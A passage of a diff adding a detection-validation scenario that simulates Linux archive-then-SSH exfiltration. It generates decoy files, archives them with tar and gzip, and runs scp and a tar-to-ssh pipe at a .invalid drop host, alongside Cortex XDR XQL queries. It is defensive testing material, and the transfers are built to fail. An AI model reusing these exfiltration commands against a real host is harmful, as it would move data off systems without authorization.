@@ -1,0 +1,647 @@
+# Archive-then-SSH-client exfiltration ATTEMPT on a Linux endpoint.
+#
+# Subject. The Cortex analytics alert "A compressed file was exfiltrated over
+# SSH" (reference page linked below). The page publishes a one-line description,
+# its periods, its severity and its ATT&CK mapping (TA0010 / T1048). It publishes
+# no trigger predicate, threshold, field name, hash, domain or IP, so none is
+# carried here: there is no indicators block, and every file, user and host
+# name below is a sandbox name chosen for this scenario, not a published one.
+#
+# What executes for real and what never happens:
+#   REAL      the decoy data (generated on the endpoint by seq and dd), the
+#             tar and gzip archive creation, the scp process and the ssh child
+#             it spawns, the tar stream piped into ssh, and the removal of the
+#             archives afterwards.
+#   NEVER     an SSH session. Both SSH-client calls name a host under
+#   HAPPENS   .invalid, which never resolves (RFC 6761), so no connection is
+#             opened and no byte of the archive leaves the host. The transfer
+#             FAILS BY DESIGN, and step-03 and step-04 exit non-zero unless
+#             the client failed at name resolution. The only network activity
+#             is the failed lookup of the .invalid name.
+#
+# Why the named alert is hunt content only. It describes an exfiltration over
+# SSH, and this chain opens no SSH session, so the event it describes never
+# occurs here. Its page also rates it Informational. It is on TTP-2026-0553
+# with its periods and this reason, and it is not an expected detection.
+#
+# Not SIM-EDR-009. That scenario is rclone bulk exfiltration to cloud storage
+# (T1567.002). This one is the archive-then-SSH-client shape (T1560.001, then
+# T1048) built from stock tools only.
+#
+# Sandbox. Every artifact lives under /var/tmp/.cortexsim-sshexfil. No real
+# user, credential or system file is read, ~/.ssh is never touched (-F
+# /dev/null, no known_hosts write, no identity file, no agent), and no
+# background process is started. step-05 removes the sandbox itself, because a
+# pull run executes no cleanup.commands.
+#
+# Sandbox ownership. /var/tmp is world-writable, the name is predictable and
+# every step runs as root. step-01 therefore creates the root atomically
+# (rm -rf, then mkdir -m 700 with no -p, which fails if anything is at the
+# path), and step-02 to step-05 each stop before touching the sandbox unless
+# ONE lstat of its root reports a directory, owned by the running user, mode
+# 700. One lstat, so type, owner and mode come from the same inode: a test
+# per property is one path lookup each, and a link swapped in between two of
+# them can pass. The guard is a check of the path, so it holds where /var/tmp
+# is sticky (mode 1777, as read back on the lab VM). Where it is not, another
+# user can rename root's own directory after the check.
+#
+# Timing. Steps are spaced 40 s apart because back-to-back steps lost telemetry
+# in this lab. Do not read this run's timeline as an attacker's. The agent
+# uploaded telemetry in batches about five minutes apart in this lab, so
+# verify no sooner than six minutes after the run completes (success_criteria).
+#
+# Lab runs. Two pull runs on pov-target-01 (Ubuntu 24.04, Cortex XDR agent
+# 9.4.0.470, report mode, identity root) on 2026-11-14 UTC: e42f2409 (00:53:28
+# to 00:56:15) and a1d6af86 (01:05:02 to 01:07:55). All five steps exited 0 in
+# both, and both SSH clients failed at name resolution as designed. The five
+# declared XQL rows returned rows in the tenant (per step below). The agent
+# recorded no event for step-02's gzip -9 of ledger-all.csv in either run, so
+# that leg is no longer declared: six step-detections, five XQL and one
+# Correlation. CR-EDR-0027 was not installed, so it raised no issue.
+scenario_id: SIM-EDR-027
+name: "Linux Archive-Then-SSH Exfiltration Attempt — Decoy Tree Archived With tar and gzip, Handed to scp and Piped to ssh at a .invalid Host (the transfer fails by design)"
+version: "1.0"
+status: active
+
+plane: EDR
+detection_types:
+  - XQL
+  - Correlation
+
+# ── UC/TC Alignment ─────────────────────────────────────────────────────────
+# The binding SIM-EDR-003 and SIM-EDR-004 use for a chain of stock tools with
+# no malware verdict: the claim is the process chain (archiver, then SSH
+# client, under one causality owner), not a verdict. TC-EDR-05 is already
+# evidenced: depth, not new index breadth. TC-DLP-01, which SIM-EDR-009 binds,
+# is left out on purpose: it would make this scenario require the Endpoint DLP
+# add-on, and nothing here inspects content.
+uc_ref: UCS-EDR-03
+tc_ref: TC-EDR-05
+tc_refs:
+  - TC-EDR-05
+pov_scenario_id: POV-SC-045
+uc_name: "Endpoint Detection & Response"
+tc_name: "Validate causality graph provides full process chain and causality owner attribution"
+
+# The reference page maps the alert to TA0010 / T1048. The collection,
+# archiving and removal techniques are this chain's own steps.
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1048"
+mitre_technique_name: "Exfiltration Over Alternative Protocol"
+additional_techniques:
+  - technique: "T1074.001"
+    name: "Data Staged: Local Data Staging"
+  - technique: "T1560.001"
+    name: "Archive Collected Data: Archive via Utility"
+  - technique: "T1070.004"
+    name: "Indicator Removal: File Deletion"
+
+threat_report: "Cortex XDR Analytics Alert Reference — A compressed file was exfiltrated over SSH"
+threat_report_url: "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/a-compressed-file-was-exfiltrated-over-ssh"
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The operator holds a root shell on the endpoint (a stolen SSH session), so
+# the Causality Group Owner is labelled sshd. cgo_anchor labels SimCore's own
+# causality graph and sets the anchor shell's argv[0]. It does NOT change the
+# tenant's CGO: in this lab every beacon-run step recorded
+# causality_actor_process_image_name = cortexsim-agent. No query here keys on
+# the anchor name; the SSH-client rows key on the image names scp and ssh,
+# which the anchor's argv[0] cannot satisfy. step-01 is the single root.
+cgo_anchor:
+  image_name: "sshd"
+  primary_username: "root"
+
+execution_identity:
+  default: root
+  options:
+    - root
+
+# Push works: every step is POSIX shell plus stock tools, nothing outlives a
+# step, and the bundle's exit trap runs the cleanup below after step-05.
+push_supported: true
+pull_supported: true
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Endpoint Signal Injection & Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "Detection Accuracy"
+threshold:
+  kpi: "Detection Accuracy"
+  op: "≥"
+  value: 16
+  unit: "%"
+success_criteria: |
+  Lab runs. Two pull runs on pov-target-01 (Ubuntu 24.04, Cortex XDR agent
+  9.4.0.470, report mode, identity root) on 2026-11-14 UTC: e42f2409
+  (00:53:28 to 00:56:15) and a1d6af86 (01:05:02 to 01:07:55). In both, all
+  five steps exited 0; scp and ssh each printed "ssh: Could not resolve
+  hostname ssh-drop.cortexsim-canary.invalid.: Name or service not known"
+  and exited 255 (OpenSSH 9.6p1); step-05 removed the sandbox. Each declared
+  XQL row was then run as written, restricted to pov-target-01; what it
+  returned is given per row below. No issue of any kind was raised in the
+  tenant between 00:50 and 01:12 UTC.
+  The transfer fails by design. Both SSH-client calls name a host under
+  .invalid, which never resolves, so no connection is opened, no SSH session
+  exists and no data leaves the host. The only network activity is the failed
+  lookup of the .invalid name. step-03 and step-04 start the client only
+  after a bounded lookup of the .invalid name returns not found, and exit
+  non-zero unless the client then failed at name resolution.
+  Six step-detections are declared, of two kinds.
+  Tier-2-verify-only (5 of 6): one XQL row on each of step-01 to step-05.
+  Each matches a process start, and on step-01 also a file event, that the
+  step really produces and that the agent recorded in the lab runs: the
+  step-01 decoy-tree row returned 88 rows for e42f2409; the step-02 tar,
+  step-03 scp, step-04 ssh and step-05 rm rows returned one row for each
+  run. They are scored by POST /api/runs/{id}/verify, never by an alert,
+  and never raise Detection Accuracy. A pull run is verified over its own
+  time window; a push run looks back one hour from when verify is called,
+  so verify within the hour. A query that runs and returns no row reads
+  fail and fails the run; a query the tenant rejects reads pending.
+  Verify timing: call verify no sooner than six minutes after the run
+  completes. An earlier verify writes fail on rows whose events are not
+  ingested yet. In the lab the agent uploaded telemetry in batches about
+  five minutes apart: e42f2409's step-02 to step-05 events (00:54:15 to
+  00:56:15) all carry insert_timestamp 00:58:38. SimCore's Tier-2 verify,
+  called 97 s after that run ended, wrote fail on the tar, gzip, scp and
+  ssh rows because their events were not ingested yet. The same queries,
+  run a few minutes later, returned rows for all but gzip, and a re-verify
+  was refused for 600 s (backoff).
+  Not declared: step-02's gzip -9 of ledger-all.csv. The agent recorded no
+  event for it in either run (step-02 says what was and was not recorded;
+  the cause is not established), so a row on it can never verify on this
+  endpoint and reads fail on a healthy tenant. The command stays in step-02,
+  and its query is on TTP-2026-0553 as an investigation query no row
+  references.
+  Alert-backed (1 of 6): correlation CR-EDR-0027 on step-05. It fires ONLY if
+  the operator installs it before the run, from TTP-2026-0553: alert name
+  exactly "EDR-027 Scratch Tarball Followed By SSH Carrier", severity Medium,
+  scheduled every 10 minutes, query time frame 1 hour, agent_hostname mapped
+  to Host Name and agent_id mapped to Agent ID, no MITRE tag. CortexSim never
+  writes it to the tenant. Its XQL, ordering stage included, was run as an
+  ordinary query over a one-hour time frame at 01:11 UTC and the tenant
+  accepted it. It returned one row for pov-target-01: legs 2, events 8,
+  last_archived 01:05:45.309, last_carried 01:07:15.445 (90 s apart). The
+  fallback XQL on the card was accepted too (legs 2, events 8). The rule
+  itself was not installed, so it has not run on a schedule and this row
+  has not been observed as an issue. The fallback stays as an alternative
+  for a tenant that will not save the rule as written. It has no order
+  check: it fires on the two legs in either order anywhere inside the
+  rule's time frame.
+  PASS: Detection Accuracy of at least 16%, which is the correlation issue
+  alone (1 of 6), with no XQL row failing verify. Detection Accuracy counts
+  only alert-backed observations, and the untagged rule alert can back
+  only the correlation row, so with that alert alone the figure stops at
+  1 of 6, which the scorer rounds to 16.7%. The bar sits at 16, not 16.7,
+  so the one alert-backed row reaches it without leaning on that rounding,
+  and 0 of 6 cannot. A tenant without the rule installed cannot reach the
+  bar: no alert matches and the verdict stays pending. Read that as a
+  missing prerequisite, not as a tenant miss. The bound index row carries a
+  qualitative threshold, so a machine PASS is recorded as not_applicable
+  (evidence, not a scored pass); a FAIL stands.
+  Reading the alert axis: with the untagged CR-EDR-0027 alert as the only
+  alert, after the match window it reads 1 detected and 5 missed. The five
+  are Tier-2 rows that the untagged rule alert cannot satisfy, so missed
+  there is expected and is not a tenant gap. This is not true of every
+  alert: the matcher also credits a row by technique, so an alert that
+  carries one of this chain's technique tags (T1048 for the step-03 and
+  step-04 rows) and comes from a correlation rule, or names no source, would
+  be credited to that step's XQL rows. That is why the rule carries no MITRE
+  tag. If more than one row reads detected, check which alert was matched.
+  Case: the correlation issue is Medium, and only Medium-or-higher issues
+  create or join a case, so it is expected to open a case of its own. It is
+  the only Medium-or-higher issue this chain can raise, so that case would
+  hold one issue. The rule was not installed for the lab runs, so neither
+  its issue nor a case from it has been observed.
+  Not declared, on the card as hunt content only: the built-in alert "A
+  compressed file was exfiltrated over SSH". Its reference page describes an
+  exfiltration over SSH; this chain opens no SSH session, so the event the
+  alert describes never occurs here. The page rates it Informational, which
+  never creates or joins a case, and documents a 14-day activation period, a
+  30-day training period and a 1-day deduplication period. It was not
+  raised during the two lab runs, as expected.
+  Endpoint prerequisites: tar, gzip, the OpenSSH client (ssh and scp),
+  timeout (coreutils) and getent (libc-bin). Read back from the lab VM on
+  2026-11-13 23:47 UTC by a read-only probe run on its beacon
+  (pov-target-01): all of them are present, the OpenSSH client is 9.6p1,
+  /var/tmp is not mounted noexec, the resolver is 127.0.0.53 with search
+  ".", and getent hosts on a .invalid name returned exit 2 at once. The two
+  lab runs then ran every step there to exit 0.
+  A missing SSH client on a pull run does not read as a miss. step-03
+  declares requires_interpreters scp and ssh, and step-04 declares ssh. The
+  beacon looks each name up on the endpoint's PATH before the step. If one
+  is absent it never runs the command and records the step not_run /
+  TOOL_ABSENT; that step's rows and the rows of every later step read
+  not_executed and leave the denominator. The cost of declaring them:
+  SimCore's advisory preflight knows only python, perl, ruby and node, so
+  GET /api/agents/{id}/preflight and the run's runtime_dependency_gaps list
+  ssh and scp as missing for every agent, including agents that have them.
+  Observed: the lab run record listed step-03 [scp, ssh] and step-04 [ssh]
+  in runtime_dependency_gaps, and those steps ran and exited 0 in both
+  runs. That listing is advisory. It does not refuse the launch. When a tool
+  really is absent, the step log says so itself, with the line
+  "!! RUNTIME_DEPENDENCY_MISSING: scp" (or ssh).
+  A push bundle ignores requires_interpreters, so every step also guards its
+  own tools and exits 127 with "command not found". The same guard is what a
+  pull run reaches if tar, gzip, timeout or getent is absent: the run stops
+  there, the report flags a step that did not run as authored, and the rows
+  of the step that stopped can read missed or fail because the host reports
+  that the step ran.
+  Three more exit codes are endpoint conditions, not tenant results. Exit 1
+  with "sandbox ... is missing or not ours", on step-02 to step-05: the
+  sandbox root is absent, is not a real directory, belongs to another user
+  or is not mode 700, so the step did nothing. Exit 3, on step-03 and
+  step-04: the lookup of the .invalid name did not return not found, either
+  because the name resolved on the endpoint or because the lookup did not
+  finish cleanly within 10 s, so the SSH client was not started. Exit 4, on
+  step-03 and step-04: the client was started but did not fail at name
+  resolution; its own output is in the step log. In all three cases the
+  designed attempt did not happen, a pull
+  run stops there with the sandbox still on disk, and that step's rows can
+  read missed or fail. Treat that step's rows as void, fix the endpoint
+  (the path under /var/tmp for exit 1, the resolver for exit 3 and exit 4),
+  remove the sandbox with the cleanup command and re-run.
+  Timeouts: a connection attempt is bounded at 3 s (ConnectTimeout=3, one
+  attempt). No SSH option bounds the name lookup, so each client is ended
+  10 s after it starts, plus a 2 s kill grace, and each getent pre-check is
+  bounded at 10 s.
+  Spacing: wait at least 75 minutes after the previous run's launch on the
+  same endpoint, or disable the rule between runs. The rule looks back one
+  hour on a 10-minute schedule, so for that long it can raise an issue for
+  the earlier run, and that issue would be credited to the new run by rule
+  name. The two lab runs were launched 12 minutes apart, so the one-hour
+  query at 01:11 UTC covered both of them.
+moat_tier: "PARITY"
+
+infra_modules_needed:
+  - base
+  - edr
+
+# Sandbox layout (every step re-states the root; each step is its own shell):
+#   /var/tmp/.cortexsim-sshexfil/stage/records/ledger-N.csv   24 generated CSV files
+#   /var/tmp/.cortexsim-sshexfil/stage/blobs/decoy-N.bin      3 files of 1 MiB from /dev/urandom
+#   /var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz     tar archive of stage/
+#   /var/tmp/.cortexsim-sshexfil/out/ledger-all.csv.gz        one collected file, gzip-compressed
+#   /var/tmp/.cortexsim-sshexfil/run/                         the SSH clients' own output and tar's stderr
+steps:
+  - id: step-01
+    name: "Collect: generate a decoy data tree in a hidden /var/tmp staging directory"
+    # What the step produces for the sensor: file creates and writes under
+    # <root>/stage by the step shell and by dd, and a PROCESS_START for each
+    # seq and dd. dd's command line carries the of= path, which is what the
+    # process leg of the declared row keys on. About 5 MB in 27 files. This
+    # is the root step. Lab run e42f2409 (pov-target-01, 2026-11-14 UTC):
+    # the declared row returned 88 rows.
+    command: |
+      # REAL file writes. Decoy data only: every byte is generated here by seq
+      # and by dd from /dev/urandom. No user, credential or system file is read.
+      set -eu
+      D=/var/tmp/.cortexsim-sshexfil
+      # The sandbox root is created atomically. /var/tmp is world-writable and
+      # this name is predictable, so mkdir runs WITHOUT -p: if anything exists
+      # at the path after the remove (a directory or a link another user
+      # planted in the gap), mkdir fails and set -e stops the step.
+      rm -rf "$D"
+      mkdir -m 700 "$D"
+      mkdir "$D/stage" "$D/stage/records" "$D/stage/blobs" "$D/out" "$D/run"
+      n=1
+      while [ "$n" -le 24 ]; do
+        f="$D/stage/records/ledger-$n.csv"
+        echo "ledger,row,marker" > "$f"
+        seq -f "ledger-$n,%g,CORTEXSIM-DECOY synthetic row" 1 2000 >> "$f"
+        n=$((n + 1))
+      done
+      for b in 1 2 3; do
+        dd if=/dev/urandom of="$D/stage/blobs/decoy-$b.bin" bs=1048576 count=1 status=none
+      done
+      test "$(find "$D/stage" -type f | wc -l)" -eq 27
+      du -sk "$D/stage"
+      echo "[CortexSim] SIM-EDR-027 step-01: 27 decoy files staged under $D/stage; every byte was generated here"
+    identity: root
+    mitre_technique: "T1074.001"
+    platforms: ["linux"]
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation — the decoy tree is written under the hidden /var/tmp staging directory (a file create or write under stage/, or the dd process start that names stage/blobs/). Tier-2 verify only"
+        ttp_ref: "TTP-2026-0553"
+        detection_id: xql-edr-027-decoy-tree-written-under-hidden-var-tmp-staging-directory
+        verification_xql: |
+          dataset = xdr_data
+          | filter (event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_CREATE_NEW, ENUM.FILE_WRITE) and action_file_path contains "/var/tmp/.cortexsim-sshexfil/stage/")
+             or (event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and action_process_image_name = "dd" and action_process_image_command_line contains "/var/tmp/.cortexsim-sshexfil/stage/blobs/")
+          | fields _time, agent_hostname, actor_causality_id, actor_process_image_name, event_sub_type, action_file_path, action_process_image_command_line
+
+  - id: step-02
+    name: "Compress: tar and gzip the staging tree, then gzip one collected file"
+    # What the sensor recorded for this step in the lab runs on pov-target-01
+    # (e42f2409 and a1d6af86, 2026-11-14 UTC):
+    #   RECORDED      FILE_CREATE_NEW of out/collect-stage.tar.gz (actor tar)
+    #                 and FILE_WRITE of it (actor gzip); PROCESS_START of
+    #                 `tar -czf ...` (actor tar), `/bin/sh -c gzip` (actor
+    #                 tar), `gzip` (actor sh), `tar -tzf ...` (actor tar) and
+    #                 `gzip -d` (actor tar). The declared tar row returned one
+    #                 row for each run.
+    #   NOT RECORDED  any command after those in this step: no `grep -c`, no
+    #                 `cat ...ledger-*.csv`, no `gzip -9 .../ledger-all.csv`,
+    #                 no `gzip -t`, no `ls -l`, and no file event for
+    #                 ledger-all.csv or ledger-all.csv.gz. Run a1d6af86 carried
+    #                 an experimental `sleep 10` before the gzip (it is not in
+    #                 this file): the sleep start was recorded, the gzip after
+    #                 it was not. The cause is not established.
+    # So the gzip -9 leg is not declared: on this endpoint its trigger is not
+    # recorded, so a row on it can never verify and reads fail on a healthy
+    # tenant. The command stays; its query is on TTP-2026-0553 as an
+    # investigation query that no row references. The one declared row keys
+    # on the tar -czf process start, not on a file event.
+    command: |
+      # REAL archive creation with stock tar and gzip.
+      set -eu
+      sleep 40   # dwell: back-to-back steps lost telemetry in this lab
+      D=/var/tmp/.cortexsim-sshexfil
+      [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      for t in tar gzip; do
+        command -v "$t" >/dev/null 2>&1 || { echo "[CortexSim] $t: command not found. tar and gzip are lab prerequisites; nothing was archived." >&2; exit 127; }
+      done
+      [ -d "$D/stage/records" ] || { echo "[CortexSim] no staging tree under $D: step-01 did not run" >&2; exit 1; }
+      A="$D/out/collect-stage.tar.gz"
+      tar -czf "$A" -C "$D" stage
+      test "$(tar -tzf "$A" | grep -c -v '/$')" -eq 27
+      cat "$D"/stage/records/ledger-*.csv > "$D/out/ledger-all.csv"
+      gzip -9 "$D/out/ledger-all.csv"
+      gzip -t "$D/out/ledger-all.csv.gz"
+      ls -l "$D/out"
+      echo "[CortexSim] SIM-EDR-027 step-02: $A holds 27 files; ledger-all.csv.gz is the single-file form"
+    identity: root
+    mitre_technique: "T1560.001"
+    platforms: ["linux"]
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation — tar starts in create mode (-czf) and names the gzip archive it writes inside the sandbox out/ directory. Tier-2 verify only"
+        ttp_ref: "TTP-2026-0553"
+        detection_id: xql-edr-027-tar-creates-gzip-archive-of-the-staging-tree
+        verification_xql: |
+          dataset = xdr_data
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "tar" and action_process_image_command_line contains "-czf"
+          | filter action_process_image_command_line contains "/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz"
+          | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line
+
+  - id: step-03
+    name: "Exfiltration attempt 1: scp the archive to a host under .invalid (fails by design)"
+    # What the step produces for the sensor: a PROCESS_START of scp whose
+    # command line carries the archive path and
+    # cortexsim@ssh-drop.cortexsim-canary.invalid.:incoming/..., and a
+    # PROCESS_START of the ssh child that scp spawns. Then a failed name
+    # lookup: a .invalid name never resolves, so there is no connection, no
+    # network row for an SSH session and nothing for the named built-in alert
+    # to describe. The declared row keys on the scp process start only.
+    # Lab runs e42f2409 and a1d6af86 (pov-target-01, OpenSSH 9.6p1,
+    # 2026-11-14 UTC): in both, scp printed "ssh: Could not resolve hostname
+    # ssh-drop.cortexsim-canary.invalid.: Name or service not known" and
+    # exited 255, the step exited 0, and the declared row returned one row
+    # for each run. The lab run record listed scp and ssh for this step in
+    # runtime_dependency_gaps although it ran: the preflight's false gap.
+    # The destination is written with a trailing dot. That makes the name
+    # absolute, so the resolver does not append a resolv.conf search domain to
+    # it and ask for a different name.
+    # Two bounds, for two things. Connection: ConnectTimeout=3 with one
+    # attempt, so a connection attempt ends within 3 s. Name lookup: no SSH
+    # option bounds it, so `timeout -k 2 10` ends the whole client 10 s after
+    # it starts, plus a 2 s kill grace, and the getent pre-check has its own
+    # 10 s bound. The step takes about 41 s and at most about 62 s.
+    # requires_interpreters: on a pull run the beacon looks scp and ssh up on
+    # the endpoint's PATH first. If one is absent the command below is never
+    # run, the step is recorded not_run / TOOL_ABSENT and its rows read
+    # not_executed, not missed. A push bundle ignores the field, so the
+    # in-step tool guard stays.
+    command: |
+      # REAL scp process and the ssh child it spawns. FAILS BY DESIGN: the
+      # destination is a .invalid name, so no connection is opened, no SSH
+      # session exists and no byte of the archive leaves the host.
+      # ~/.ssh is never touched: -F /dev/null, no known_hosts file, no identity
+      # file, no agent, no prompt.
+      set -eu
+      sleep 40   # dwell
+      D=/var/tmp/.cortexsim-sshexfil
+      [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      A="$D/out/collect-stage.tar.gz"
+      # Trailing dot: an absolute name, never extended with a search domain.
+      H=ssh-drop.cortexsim-canary.invalid.
+      for t in scp ssh timeout getent; do
+        command -v "$t" >/dev/null 2>&1 || { echo "[CortexSim] $t: command not found. The OpenSSH client (ssh, scp), timeout and getent are lab prerequisites; no transfer was attempted." >&2; exit 127; }
+      done
+      [ -s "$A" ] || { echo "[CortexSim] no archive at $A: step-02 did not run" >&2; exit 1; }
+      # Fail closed (exit 3). A .invalid name must never resolve (RFC 6761).
+      # The client starts ONLY when the lookup, bounded at 10 s, answers "not
+      # found" (getent exit 2). Exit 0 means a resolver that answers every name
+      # is in the path. Any other code means the lookup did not finish cleanly
+      # (124 is timeout ending it), and that is not proof the name is dead.
+      g=0
+      timeout 10 getent hosts "$H" >/dev/null 2>&1 || g=$?
+      if [ "$g" -eq 0 ]; then
+        echo "[CortexSim] refuse (exit 3): $H resolves on this host, so the SSH client was not run. Fix the endpoint's resolver and re-run." >&2
+        exit 3
+      fi
+      if [ "$g" -ne 2 ]; then
+        echo "[CortexSim] refuse (exit 3): the lookup of $H did not finish cleanly (getent exit $g; 124 means it was still running after 10 s), so the SSH client was not run. Fix the endpoint's resolver and re-run." >&2
+        exit 3
+      fi
+      # ConnectTimeout=3 bounds a connection attempt. It does not bound the
+      # name lookup, so timeout ends the whole client after 10 s (+2 s grace).
+      O="-F /dev/null -o BatchMode=yes -o ConnectTimeout=3 -o ConnectionAttempts=1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o IdentityFile=/dev/null -o IdentityAgent=none"
+      rc=0
+      # The expected failure must not fail the step, so the exit code is kept.
+      timeout -k 2 10 scp $O "$A" "cortexsim@$H:incoming/collect-stage.tar.gz" < /dev/null > "$D/run/scp.out" 2>&1 || rc=$?
+      cat "$D/run/scp.out"
+      echo "[CortexSim] scp exit code: $rc"
+      if [ "$rc" -eq 0 ]; then
+        echo "[CortexSim] scp reported success against a .invalid host. That must not happen: treat this run as invalid." >&2
+        exit 1
+      fi
+      if ! grep -q "Could not resolve hostname" "$D/run/scp.out"; then
+        echo "[CortexSim] exit 4: scp failed, but not at name resolution (a lookup killed at its 10 s bound looks like this), so the designed failure did not happen. Read the scp output above, fix the endpoint's resolver and re-run." >&2
+        exit 4
+      fi
+      echo "[CortexSim] SIM-EDR-027 step-03: scp failed at name resolution as designed; no connection was opened and no data left the host"
+    identity: root
+    mitre_technique: "T1048"
+    platforms: ["linux"]
+    requires_interpreters: ["scp", "ssh"]
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation — scp starts with the archive path and a remote destination under .invalid on its command line. The copy fails by design: the name never resolves and no data leaves the host. Tier-2 verify only"
+        ttp_ref: "TTP-2026-0553"
+        detection_id: xql-edr-027-scp-started-with-the-archive-and-a-remote-destination
+        verification_xql: |
+          dataset = xdr_data
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
+          | filter action_process_image_name = "scp" and action_process_image_command_line contains "/var/tmp/.cortexsim-sshexfil/out/collect-stage.tar.gz"
+          | filter action_process_image_command_line contains "cortexsim-canary.invalid"
+          | fields _time, agent_hostname, actor_causality_id, causality_actor_process_image_name, actor_process_image_name, action_process_image_command_line
+
+  - id: step-04
+    name: "Exfiltration attempt 2: pipe a tar stream of the staging tree into ssh at the .invalid host (fails by design)"
+    # What the step produces for the sensor: a PROCESS_START of tar with
+    # -czf - (the archive goes to a pipe, not a file), and a PROCESS_START of
+    # ssh whose command line carries the .invalid host and the remote command
+    # `cat > incoming/stage-stream.tar.gz`. ssh fails at name resolution
+    # before it reads its input, so the tar stream ends in a closed pipe on
+    # this host. The ssh child that scp spawned in step-03 does not carry
+    # stage-stream.tar.gz, so it cannot satisfy this row.
+    # Lab runs e42f2409 and a1d6af86 (pov-target-01, OpenSSH 9.6p1,
+    # 2026-11-14 UTC): in both, ssh printed "ssh: Could not resolve hostname
+    # ssh-drop.cortexsim-canary.invalid.: Name or service not known" and
+    # exited 255, the step exited 0, and the declared row returned one row
+    # for each run. The lab run record listed ssh for this step in
+    # runtime_dependency_gaps although it ran: the preflight's false gap.
+    # Same destination, same two bounds and same exit codes as step-03: a
+    # connection attempt ends within 3 s (ConnectTimeout=3, one attempt); the
+    # name lookup is bounded by `timeout -k 2 10` on the client (10 s plus a
+    # 2 s kill grace) and by a 10 s timeout on the getent pre-check.
+    # requires_interpreters: on a pull run the beacon looks ssh up first and
+    # does not run the command if it is absent (not_run / TOOL_ABSENT, rows
+    # not_executed). A push bundle ignores the field, so the tool guard stays.
+    command: |
+      # REAL tar and ssh processes joined by a pipe. FAILS BY DESIGN for the
+      # same reason as step-03: the .invalid host never resolves, ssh exits
+      # before it reads its input, and the stream goes nowhere.
+      set -eu
+      sleep 40   # dwell
+      D=/var/tmp/.cortexsim-sshexfil
+      [ "$(stat -c %F:%u:%a "$D" 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox $D is missing or not ours: step-01 did not complete" >&2; exit 1; }
+      # Trailing dot: an absolute name, never extended with a search domain.
+      H=ssh-drop.cortexsim-canary.invalid.
+      for t in tar ssh timeout getent; do
+        command -v "$t" >/dev/null 2>&1 || { echo "[CortexSim] $t: command not found. tar, the OpenSSH client (ssh), timeout and getent are lab prerequisites; no transfer was attempted." >&2; exit 127; }
+      done
+      [ -d "$D/stage/records" ] || { echo "[CortexSim] no staging tree under $D: step-01 did not run" >&2; exit 1; }
+      # Fail closed (exit 3), as in step-03: the client starts ONLY when the
+      # lookup, bounded at 10 s, answers "not found" (getent exit 2).
+      g=0
+      timeout 10 getent hosts "$H" >/dev/null 2>&1 || g=$?
+      if [ "$g" -eq 0 ]; then
+        echo "[CortexSim] refuse (exit 3): $H resolves on this host, so the SSH client was not run. Fix the endpoint's resolver and re-run." >&2
+        exit 3
+      fi
+      if [ "$g" -ne 2 ]; then
+        echo "[CortexSim] refuse (exit 3): the lookup of $H did not finish cleanly (getent exit $g; 124 means it was still running after 10 s), so the SSH client was not run. Fix the endpoint's resolver and re-run." >&2
+        exit 3
+      fi
+      # ConnectTimeout=3 bounds a connection attempt; timeout ends the whole
+      # client, name lookup included, after 10 s (+2 s grace).
+      O="-F /dev/null -o BatchMode=yes -o ConnectTimeout=3 -o ConnectionAttempts=1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o IdentitiesOnly=yes -o IdentityFile=/dev/null -o IdentityAgent=none"
+      rc=0
+      # The pipeline's exit code is ssh's. The expected failure must not fail
+      # the step, so it is kept.
+      tar -czf - -C "$D" stage 2> "$D/run/tar-stream.err" | timeout -k 2 10 ssh $O -T "cortexsim@$H" "cat > incoming/stage-stream.tar.gz" > "$D/run/ssh-stream.out" 2>&1 || rc=$?
+      cat "$D/run/ssh-stream.out"
+      echo "[CortexSim] ssh exit code: $rc"
+      if [ "$rc" -eq 0 ]; then
+        echo "[CortexSim] ssh reported success against a .invalid host. That must not happen: treat this run as invalid." >&2
+        exit 1
+      fi
+      if ! grep -q "Could not resolve hostname" "$D/run/ssh-stream.out"; then
+        echo "[CortexSim] exit 4: ssh failed, but not at name resolution (a lookup killed at its 10 s bound looks like this), so the designed failure did not happen. Read the ssh output above, fix the endpoint's resolver and re-run." >&2
+        exit 4
+      fi
+      echo "[CortexSim] SIM-EDR-027 step-04: ssh failed at name resolution as designed; the tar stream ended in a closed pipe and no data left the host"
+    identity: root
+    mitre_technique: "T1048"
+    platforms: ["linux"]
+    requires_interpreters: ["ssh"]
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Validation — ssh starts with the .invalid host and a remote command that would write stage-stream.tar.gz, its input piped from tar. No session is opened: the name does not resolve. Tier-2 verify only"
+        ttp_ref: "TTP-2026-0553"
+        detection_id: xql-edr-027-ssh-started-with-a-remote-archive-write-fed-by-a-tar-pipe
+        verification_xql: |
+          dataset = xdr_data
+          | filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
